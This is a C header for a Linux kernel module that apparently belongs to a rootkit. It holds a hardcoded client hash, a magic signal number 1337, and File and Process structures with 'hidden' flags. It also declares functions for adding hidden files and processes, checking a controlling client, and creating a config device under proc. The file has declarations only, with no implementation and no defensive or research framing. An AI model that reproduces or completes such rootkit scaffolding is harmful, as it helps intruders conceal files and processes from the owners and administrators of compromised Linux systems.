#include <linux/module.h>       
#include <linux/kernel.h>       
#include <linux/proc_fs.h>      
#include <linux/uaccess.h>

#include "util.h"
#include "debug.h"

#define DEF_USUM "c26cb4a24cb2faaab442669624b8cdca1e5a769ac3b60674c332422fedca0b3f"
#define DEF_SIGNAL 1337

#define RES_NOTFOUND "NOTFOUND"
#define RES_EMPTY "NONE"
#define RES_BAD "BAD"
#define RES_OK "OK"

#define CMD_MAX 4096
#define USUM_LEN 64 

struct File {
	char path[CMD_MAX];
	bool hidden;
};

struct Process {
	unsigned int pid;
	bool hidden;
	bool is_client;
};

extern char usum[USUM_LEN+1];
extern char cfgdev_name[USUM_LEN+20];
extern char cfgdev_path[USUM_LEN+30];

extern int client_signal;
extern bool in_debug;

extern struct File *files;
extern int files_count;
extern struct Process *procs;
extern int procs_count;

bool check_client(void);
bool check_file(char*);

bool add_proc(char*, bool);	
bool add_file(char*);	

bool create_cfg(void);
void clean_cfg(void);
